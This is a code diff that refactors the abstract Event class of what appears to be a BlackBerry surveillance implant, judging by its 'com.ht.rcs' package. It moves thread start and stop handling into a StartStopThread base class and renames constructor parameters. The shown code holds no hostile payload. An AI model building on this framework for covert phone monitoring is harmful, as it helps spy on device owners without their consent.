@@ -11,13 +11,14 @@ import com.ht.rcs.blackberry.Status;
 import com.ht.rcs.blackberry.action.Action;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
+import com.ht.rcs.blackberry.utils.StartStopThread;
 import com.ht.rcs.blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class Event.
  */
-public abstract class Event extends Thread {
+public abstract class Event extends StartStopThread {
 
     /** The debug. */
     private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);
@@ -59,7 +60,7 @@ public abstract class Event extends Thread {
     public static final int EVENT_BATTERY = EVENT + 0xb;
 
     // variables
-    
+
     /** The Event type. */
     public int eventType = -1;
 
@@ -73,12 +74,8 @@ public abstract class Event extends Thread {
     /** The status obj. */
     protected Status statusObj = null;
 
-    /** The Need to stop. */
-    boolean needToStop = false;
 
-    /** The Running. */
-    boolean running = false;
-    
+
     /**
      * Factory.
      * 
@@ -92,8 +89,8 @@ public abstract class Event extends Thread {
      *            the conf params
      * @return the event
      */
-    public static Event factory(int eventId, int eventType, int actionId,
-            byte[] confParams) {
+    public static synchronized Event factory(int eventId, int eventType,
+            int actionId, byte[] confParams) {
         Event event = null;
 
         switch (eventType) {
@@ -159,11 +156,13 @@ public abstract class Event extends Thread {
      * @param actionId
      *            the action id
      */
-    protected Event(int eventId_, int actionId_) {
+    protected Event(int eventType_, int actionId_) {
         this.statusObj = Status.getInstance();
 
-        this.eventType = eventId_;
+        this.eventType = eventType_;
         this.actionId = actionId_;
+        
+        enable(true);
     }
 
     /**
@@ -176,62 +175,11 @@ public abstract class Event extends Thread {
      * @param confParams
      *            the conf params
      */
-    protected Event(int eventId_, int actionId_, byte[] confParams) {
-        this(eventId_, actionId_);
+    protected Event(int eventType_, int actionId_, byte[] confParams) {
+        this(eventType_, actionId_);
         parse(confParams);
     }
-
-    /**
-     * Event run.
-     */
-    protected abstract void eventRun();
-
-    /**
-     * Event sleep.
-     * 
-     * @param millisec
-     *            the millisec
-     * @return true, if successful
-     */
-    protected boolean eventSleep(int millisec) {
-        int loops = 0;
-        int sleepTime = 1000;
-
-        if (millisec < sleepTime) {
-            Utils.sleep(millisec);
-
-            if (needToStop) {
-                needToStop = false;
-                return true;
-            }
-
-            return false;
-        } else {
-            loops = millisec / sleepTime;
-        }
-
-        while (loops > 0) {
-            Utils.sleep(millisec);
-            loops--;
-
-            if (needToStop) {
-                needToStop = false;
-                return true;
-            }
-        }
-
-        return false;
-    }
-
-    /**
-     * Checks if is running.
-     * 
-     * @return true, if is running
-     */
-    public boolean isRunning() {
-        return running;
-    }
-
+  
     /**
      * Parses the.
      * 
@@ -241,27 +189,9 @@ public abstract class Event extends Thread {
      */
     protected abstract boolean parse(byte[] confParams);
 
-    /*
-     * (non-Javadoc)
-     * 
-     * @see java.lang.Thread#run()
-     */
-    public void run() {
-        debug.info("Run");
-        needToStop = false;
-        running = true;
+  
+    public String toString() {
+        return "Event:" + eventType + "|" + eventId;
 
-        eventRun();
-
-        running = false;
-        debug.info("End");
-    }
-
-    /**
-     * Stop.
-     */
-    public void stop() {
-        debug.info("Stopping...");
-        needToStop = true;
     }
 }
